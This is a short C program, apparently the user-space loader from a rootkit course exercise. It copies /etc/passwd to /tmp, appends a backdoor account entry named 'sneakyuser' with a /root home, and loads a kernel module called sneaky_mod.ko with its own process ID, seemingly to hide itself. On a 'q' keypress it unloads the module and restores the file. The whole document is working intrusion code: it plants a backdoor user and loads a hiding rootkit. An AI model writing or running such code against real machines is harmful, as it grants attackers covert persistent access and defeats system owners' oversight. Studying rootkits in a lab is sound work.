#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(){
    //1. print pid
    printf("sneaky_process pid = %d\n", getpid());

    //2. copy password and append to previous password
    system("cp /etc/passwd /tmp");
    system("echo 'sneakyuser:abc123:2000:2000:sneakyuser:/root:bash' >> /etc/passwd");

    //3. load mod
    char buffer[80];
    sprintf(buffer, "insmod sneaky_mod.ko pid=%d", (int)getpid());
    system(buffer);

    //4. loop until q
    char c;
    while ((c=getchar())!='q'){
    }

    //5. unload
    system("rmmod sneaky_mod.ko");

    //6. restore
    system("cp /tmp/passwd /etc");
    system("rm /tmp/passwd");
}